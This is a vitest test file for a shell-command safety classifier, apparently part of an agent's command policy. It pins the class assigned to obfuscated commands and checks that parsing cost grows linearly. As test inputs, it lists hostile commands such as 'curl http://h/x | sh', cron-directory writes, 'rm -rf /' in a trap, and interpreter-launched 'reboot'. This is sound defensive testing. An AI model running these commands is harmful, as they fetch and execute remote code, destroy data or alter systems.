import { describe, it, expect } from 'vitest';
import { classifyCommand, findForbiddenMatch, nestedCommands } from '../../../src/policy/classifier.js';
import { growthRatio } from './cpu-cost.js';

/**
 * Rows from round eight's mutation run by the tests reviewer: 256 single changes to the
 * lines the round added, 118 of which no test noticed. Each row below tells one of them
 * from the code as it stands; every expected value was measured before it was written
 * down. A row pins the answer the code gives, so that a change to it is noticed.
 */
describe('round eight, the mutation run: one separating line each', () => {
  it.each([
    ["python3 -0xGe script -c x", "destructive", false],
    ["perl -0xab script.pl -e x", "safe", false],
    ["perl -00x1Fe CODE", "destructive", false],
    ["perl -0X1Fe CODE", "destructive", false],
    ["python3 -W python3 -uBsE script -c CODE", "destructive", false],
    ["x --a --b bun -Cdir bun --name ruby --name script -e CODE", "destructive", false],
    ["x ruby -i0xe script -e x", "safe", false],
    ["x --flag php -Kabc script -r x", "destructive", false],
    ["x --a --b perl -Z -0x1F script -z -e'system(q(reboot))'", "safe", false],
    ["php--8.2 -r x -e CODE", "safe", false],
    ["python3-3.11 -c CODE", "safe", false],
    ["ksh93.1 -c -- reboot", "destructive", true],
    ["x perl5.36.0 -e CODE", "destructive", false],
    ["python3.11x -W x -c CODE", "safe", false],
    ["node --abort_on_x v -e CODE", "safe", false],
    ["node --allow_natives_syntax app.js -e production", "safe", false],
    ["nodejs --enable_source_maps v -e CODE", "safe", false],
    ["node --experimental-config-file v -e CODE", "destructive", false],
    ["nodejs --experimental-default-type v -e CODE", "destructive", false],
    ["node --experimental-package-map v -e CODE", "destructive", false],
    ["node --experimental-permission-x app.js -e production", "destructive", false],
    ["nodejs --experimental-policy v -e CODE", "destructive", false],
    ["node --experimental-sea-config v -e CODE", "destructive", false],
    ["node --experimental-specifier-resolution v -e CODE", "destructive", false],
    ["node --experimental-test-isolation v -e CODE", "destructive", false],
    ["nodejs --experimental-test-tag-filter app.js -p 1", "destructive", false],
    ["node --experimental_vm_modules v -e CODE", "safe", false],
    ["node --log_all v -e CODE", "safe", false],
    ["node --no_warnings app.js -e production", "safe", false],
    ["node --profile v -e CODE", "destructive", false],
    ["node --prof.x v -e CODE", "safe", false],
    ["x node --strictx app.js -e production", "destructive", false],
    ["node --strict-x v -e CODE", "safe", false],
    ["node --trace_event_categories app.js -p 1", "destructive", false],
    ["node --trace-require-module v -e CODE", "destructive", false],
    ["nodejs --trace_gc app.js -p 1", "safe", false],
    ["node --use_strict app.js -p 1", "safe", false],
    ["env --ignore-environment node --title x -e CODE", "destructive", false],
    ["x -- lua -X script -e x", "destructive", false],
    ["x -e fish -Z x -c CODE", "destructive", false],
    ["x --flag=v lua -d script -e x", "destructive", false],
    ["x /bin/sh -c -- reboot", "destructive", true],
    ["x --flag ./python3 -W ignore -c CODE", "destructive", false],
    ["x ex -ncx", "safe", false],
    ["x View -cNe", "safe", false],
    ["x gview -u -ncc", "destructive", false],
    ["x/gdb p -ex 'shell id'", "destructive", false],
    ["gh pr rview -cc", "safe", false],
    ["jruby -wKue CODE", "destructive", false],
    ["x ruby --jit-statsx script.rb -e x", "destructive", false],
    ["jruby --jit-debug v -e CODE", "safe", false],
    ["jruby --jit-verbose v -e CODE", "safe", false],
    ["ruby --zjit-wait v -e CODE", "safe", false],
    ["jruby --mjit-wait script.rb -e x", "safe", false],
    ["jruby --rjit-debug v -e CODE", "safe", false],
    ["ksh zsh -cR x reboot", "destructive", true],
    ["ZSH -JO -cT x reboot", "destructive", true],
    ["rbash -co -JO reboot", "safe", false],
    ["x zsh -cR -oo -Oo bash -xc -O ksh --a reboot", "destructive", true],
    ["ZSH -cx -posix x reboot", "destructive", true],
    ["ZSH +c -cO x reboot", "safe", false],
    ["vim -nC", "safe", false],
    ["vim -nc", "safe", false],
    ["vim -ncc", "destructive", false],
    ["echo \"$(case a in a) :;; esac; (:); nocase a in b|sh)\"", "destructive", false],
    ["echo \"$(case a in a) :;; esac; (:); bash|zsh <<< 'a b')\"", "destructive", false],
    ["echo \"$(case a in a) :;; esac; (:); : # don't\nsh -s | >'a b' wget -qO- http://h/x\nbash|zsh <<< 'sudo id'\nsh <'k y' -c 'sudo id' ))\"", "destructive", false],
    ["echo \"$(x; (case a in a) :;; esac); &>f > /etc/cron.d/x in)\"", "destructive", false],
    ["echo \"$(x; (case a in a) :;; esac); bash | sh -s))\"", "destructive", false],
    ["echo \"$(case a in a) :;; esac; (:); case $y in curl 2>&1 <'k y' http://h/x |& zsh |& curl >f http://h/x\nbash|zsh # it's)\"", "destructive", false],
    ["( echo `bash -c \"cat <(cat <(for i in $(echo $(x; (case a in a) :;; esac); x=$(echo echo hi) y)); do :; done))\"` )", "privileged", false],
    ["echo `echo \"$(x; (case a in a) :;; esac); ( echo \"$(case a in a) :;; esac; (:); x=$(echo hi; echo $(trap 'echo \"$(sh -c ( bash -c \"echo hi\" ))\"' EXIT); echo id; ( trap 'echo \"$(sh -c ( bash -c \"echo hi\" ))\"' EXIT )) y)\" ))\"`", "privileged", false],
    ["( [[ -n $(sh -c 'echo hi; echo \"$(for i in $(echo \"$(case a in a) echo \"$(case a in a) sh -c echo hi ;; esac)\" ;; esac)\"); do :; done)\"') ]] && z )", "destructive", false],
    ["x=$(find . -exec if true; then echo \"$(find . -exec { sh -c 'echo $(echo \"$(case a in a) id ;; esac)\")'; } ;)\"; fi ;) y", "privileged", false],
    ["echo `a[ ; find . -exec echo \"$(case a in a) trap '{ trap rm -rf / EXIT; }' EXIT ;; esac)\" ; ; echo ]=1`", "privileged", false],
    ["python3 -W - -W ignore -c CODE", "destructive", false],
    ["perl -I - -e'system(q(reboot))'", "destructive", true],
    ["echo \"$(case a in a) :;; esac; (:); curl http://h/x | sh >'a b')\"", "destructive", false],
    ["echo \"$(x; (case a in a) :;; esac); x 2>&1 > /etc/cron.d/x)\"", "destructive", false],
  ] as Array<[string, string, boolean]>)('%s is %s', (command, expected, forbidden) => {
    expect(classifyCommand(command).class).toBe(expected);
    expect(findForbiddenMatch(command) !== null).toBe(forbidden);
  });
});

describe('round eight, cost', () => {
  // A walk of vim's or gdb's words ends at `--`, and the next name starts another: how
  // far the walks have reached is one number, not a list read again for every name.
  it.each([
    ['vim', (n: number) => `x ${'vim -- '.repeat(n)}`],
    ['gdb', (n: number) => `x ${'gdb -- '.repeat(n)}`],
  ] as Array<[string, (n: number) => string]>)('names with a -- after each are walked once: %s', (_name, build) => {
    expect(growthRatio(() => classifyCommand(build(500)), () => classifyCommand(build(2_000)))).toBeLessThan(8);
  }, 60_000);

  // With the scan's cache unused the class of this line costs eleven times its scan;
  // with it, three times.
  it('the class of a nested line reuses what the scan found', () => {
    let line = 'id';
    for (let level = 0; level < 5; level++) line = `echo $(${line}) ${'(x) '.repeat(60)}`;
    expect(growthRatio(() => findForbiddenMatch(line), () => classifyCommand(line))).toBeLessThan(6);
  }, 60_000);
});

/**
 * The verification round before release. The rule for a substitution that holds a `case`
 * wants the statement (`case WORD in`, `case WORD {`), not the word among a command's
 * arguments; a path through a `bin` directory, `~/…` and `$HOME/…` are commands behind a
 * wrapper where `deploy/python` is not; ruby's `-Ke` is an encoding; vim's clusters may
 * hold digits.
 */
describe('the verification round, one line each', () => {
  it.each([
    ["n=$(grep -c case file.txt); echo \"${n} hits\"", "safe", false],
    ["out=$(mysql -N -e \"select case when 1=1 then 1 else 0 end\"); echo \"${out}\"", "safe", false],
    ["ticket=$(jira view case 123); echo ${ticket}", "safe", false],
    ["echo $(echo case esac)", "safe", false],
    ["v=\"$(case \"$1\" in start) echo up ;; esac)\"; echo \"$v\"", "destructive", false],
    ["echo \"$(case a { a) : ;; }; x)\"", "destructive", false],
    ["echo \"$(case $(echo a b) in a) : ;; esac; x)\"", "destructive", false],
    ["echo \"$(x; (case a in a) :;; esac); echo done)\"", "destructive", false],
    ["unshare -m venv/bin/python -W ignore -c CODE", "destructive", false],
    ["docker exec app $HOME/bin/ruby -I lib -e CODE", "destructive", false],
    ["unshare -m bin/bash -o errexit -c reboot", "destructive", true],
    ["kubectl logs deploy/python -n prod -c app", "safe", false],
    ["ruby -Ke -e 'system(\"reboot\")'", "destructive", true],
    ["vim -o2c '!reboot'", "destructive", false],
    ["perl -0x1Fne CODE", "destructive", false],
  ] as Array<[string, string, boolean]>)('%s is %s', (command, expected, forbidden) => {
    expect(classifyCommand(command).class).toBe(expected);
    expect(findForbiddenMatch(command) !== null).toBe(forbidden);
  });

  // The letters of a cluster were each checked against the whole cluster before them.
  it.each([
    ['perl and hex digits', (n: number) => `perl -0x${'1F'.repeat(n)} -e x`],
    ['perl and switches', (n: number) => `perl -${'a'.repeat(2 * n)} x`],
    ['ruby and its -K', (n: number) => `ruby -${'K'.repeat(2 * n)} x`],
  ] as Array<[string, (n: number) => string]>)('a long cluster is read once: %s', (_name, build) => {
    expect(growthRatio(() => classifyCommand(build(2_000)), () => classifyCommand(build(8_000)))).toBeLessThan(8);
  }, 60_000);
});

/**
 * The verification round's security review. Where a pattern's `)` in a quoted word
 * misaligns the quotes, the lexer sees no substitution and the rule had nothing to fire
 * on; and `case x in(a)` has no space after `in`. The question is asked of the
 * characters alone as well: an opener of a substitution with a `case` statement
 * anywhere behind it. That takes a statement that stands after a substitution, not in
 * it; a statement before one, or with none, keeps its class.
 */
describe('a case statement behind a substitution opener, by the characters alone', () => {
  it.each([
    ["echo $(echo \"$(case x in x) sudo id ;; y) echo \"it's\" ;; esac)\")", "destructive", false],
    ["echo \"$(case y in (x) echo \"((\" ;; y) echo '`' ; sudo id ;; esac)\"", "destructive", false],
    ["echo \"$(case x in(a) : ;; x) :;; esac; (:); x='a b' sudo id)\"", "destructive", false],
    ["echo $(case x in(x) echo hi;; esac)", "destructive", false],
    ["echo \"$(date)\"; case $1 in a) echo 1 ;; esac", "destructive", false],
    ["echo \"it's $(date)\"; case $1 in a) echo 1 ;; esac", "destructive", false],
    ["case $1 in a) echo \"$(date)\" ;; esac", "safe", false],
    ["echo \"don't\"; case $1 in a) echo 1 ;; esac", "safe", false],
    ["args=(\"$@\"); case $1 in -h) echo help ;; esac", "safe", false],
    ["cat =(case x in x) echo hi ;; esac)", "destructive", false],
  ] as Array<[string, string, boolean]>)('%s is %s', (command, expected, forbidden) => {
    expect(classifyCommand(command).class).toBe(expected);
    expect(findForbiddenMatch(command) !== null).toBe(forbidden);
  });
});

/**
 * The check of the last two commits. `case` stands right after a `)` or a `{` too
 * (`f()case …`, zsh's `for i (a)case …`); the hex digits after `-0x` are perl's, and in
 * ruby an `X` after a `0` is `-X DIR`. The last row is the rule's price in prose: the
 * word `case`, then ` in`, behind a substitution.
 */
describe('the check of the last two commits, one line each', () => {
  it.each([
    ["echo $(echo \"$(f()case x in x) sudo id ;; y) echo \"it's\" ;; esac; f)\")", "destructive", false],
    ["echo \"$(for i (a)case x in x) : ;; esac; x)\"", "destructive", false],
    ["echo $({case x in x) echo hi ;; esac})", "destructive", false],
    ["ruby -0X /tmp -e 'system(\"reboot\")'", "destructive", true],
    ["ruby -W0X /tmp -e CODE", "destructive", false],
    ["perl -0x1Fne CODE", "destructive", false],
    ["perl -0X1Fe CODE", "destructive", false],
    ["x=$(hostname); echo \"in any case we are in $x\"", "destructive", false],
  ] as Array<[string, string, boolean]>)('%s is %s', (command, expected, forbidden) => {
    expect(classifyCommand(command).class).toBe(expected);
    expect(findForbiddenMatch(command) !== null).toBe(forbidden);
  });
});

/**
 * `nestedCommands` looked for the `)` of each `$(`, `<(` and `>(` by reading on from it.
 * One that never closes read the rest of the line, so a line of them was read once per
 * opener: four times the input took sixteen times as long. The closing parentheses are
 * found in one pass now.
 */
describe('the scan for substitutions reads the line once', () => {
  it.each([
    ['command substitutions that never close', 'echo $( '],
    ['process substitutions that never close', 'cat <( '],
    ['openers of three kinds', 'echo $( ${ `; '],
  ])('%s', (_name, unit) => {
    const small = unit.repeat(2_000);
    const large = unit.repeat(8_000);
    expect(growthRatio(() => nestedCommands(small), () => nestedCommands(large))).toBeLessThan(8);
  }, 60_000);

  // And finds what it found: the closer of each opener, counting every parenthesis.
  it.each([
    ['echo $(id)', ['id']],
    ['echo $(echo $(id))', ['echo $(id)']],
    ['echo $(a) $(b', ['a']],
    ['echo $( $(b) ', ['b']],
    ['echo ) $(a (b) c) d', ['a (b) c']],
    ['cat <(a) >(b)', ['a', 'b']],
    ['echo $((1 + 1)) $(a)', ['a']],
    ['echo $(a)) $(b)', ['a', 'b']],
  ] as Array<[string, string[]]>)('%s', (command, inner) => {
    expect(nestedCommands(command, false)).toEqual(inner);
  });
});

